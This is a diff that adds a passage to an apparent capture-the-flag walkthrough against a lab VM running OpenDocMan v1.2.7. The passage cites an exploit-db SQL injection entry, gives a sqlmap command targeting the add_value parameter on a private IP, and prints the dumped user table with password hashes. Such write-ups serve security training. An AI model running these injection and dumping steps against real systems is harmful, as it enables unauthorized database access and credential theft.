@@ -114,4 +114,27 @@ First I've tried to upload a simple test.php file with a print inside, but I've 
 MIMETYPE: text/x-php Failed
 ```
 
-So we can assume that the system is blocking PHP files. So I started looking for exploits for "OpenDocMan
+So we can assume that the system is blocking PHP files. So I started looking for exploits for "OpenDocMan v1.2.7" version in use. I've found in www.exploit-db.com the following exploit: 
+
+https://www.exploit-db.com/exploits/32075/
+
+The exploit is related to a SQL Injection, so let's fire up sqlmap:
+
+```
+sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user'
+-p add_value -D jabcd0cs --dump
+```
+
+After some sqlmapping we managed to reach a password table called "odm_user" with some users and passwords: 
+
+```
+Database: jabcd0cs
+Table: odm_user
+[2 entries]
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| id | phone       | Email              | username | password                                 | last_name | first_name | department | pw_reset_code |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | <blank>       |
+| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
++----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+```
